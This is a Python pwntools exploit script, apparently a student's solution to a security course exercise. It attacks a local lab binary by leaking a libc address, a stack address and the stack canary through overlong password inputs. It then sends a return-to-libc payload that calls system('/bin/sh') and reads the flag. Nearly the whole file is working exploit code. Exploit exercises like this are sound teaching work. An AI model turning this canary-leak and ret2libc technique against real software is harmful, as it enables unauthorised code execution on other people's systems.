#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise4/exercise4a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
# pause()

print(r.recvline())        # Hi whats your name
r.sendline(b"A"*38)

print(r.recvline())        # Welcome 
print(r.recvline())        # !\n
print(r.recvline())        # \n
print(r.recvline())        # Enter Password

payload = b"A"*3
print(f"Sending: {payload}")
r.sendline(payload)          # Send password

print(r.recvline())        # Well of course
st = r.recvline()          # func_addr is not the password
print(f"received_line: {st}")

func_addr = st[:4]
print(f"received_func_addr: {hex(u32(func_addr))}")
libc_end = u32(func_addr) + 0x1e53b4
libc_base = libc_end - 0x1ec000
print(f"Libc base: {hex(libc_base)}")

print(r.recvline())        # Unauthorized Try again
print(r.recvline())        # Enter password

payload = b"A"*23
print(f"Sending: {payload}")
r.sendline(payload)          # Send password

print(r.recvline())        # Well of course
st = r.recvline()          # bp_addr is not the password
print(f"received_line: {st}")

bp_addr = u32(st[:4])
sp_addr = bp_addr - 0x58
print(f"Stack top address: {hex(sp_addr)}")

print(r.recvline())        # Unauthorized Try again
print(r.recvline())        # Enter password

payload = b"A"*71
print(f"Sending: {payload}")
r.sendline(payload)          # Send password

print(r.recvline())        # Well of course
st = r.recvline()          # can_val is not the password
canary_value = st[:st.index(b' ')]
print(f"received_line: {st}")
print(f"received_canary: {hex(u32(canary_value))}")

print(r.recvline())        # Unauthorized Try again
print(r.recvline())        # Enter password

libc_elf = ELF('/lib/i386-linux-gnu/libc.so.6')
sys_offset = libc_elf.symbols['system']
sys_addr = libc_base + sys_offset
print(f"Libc System Offset: {hex(sys_offset)}")
print(f"Libc System Address: {hex(sys_addr)}")

exit_offset = libc_elf.symbols['exit']
exit_addr = libc_base + exit_offset
print(f"Libc Exit Offset: {hex(exit_offset)}")
print(f"Libc Exit Address: {hex(exit_addr)}")

bin_sh_addr = libc_base + 0x18e363

payload = b"cat flag\0"
payload += b"A"*63
payload += canary_value
payload += b"A"*16
payload += p32(sys_addr)
payload += p32(exit_addr)
payload += p32(bin_sh_addr)

print(f"Sending: {payload}")
r.sendline(payload)        # Send password

print(r.recvline())        # Well of course
r.sendline('cat flag')     # Send cmd
print(r.recvline())        # FLAG
# st = r.recvline()          # bp_addr is not the password
# print(f"received_line: {st}")

# bp_addr = st[:4]
# print(f"received_func_addr: {hex(u32(bp_addr))}")

# print(r.recvline())        # Unauthorized Try again
# print(r.recvline())        # Enter password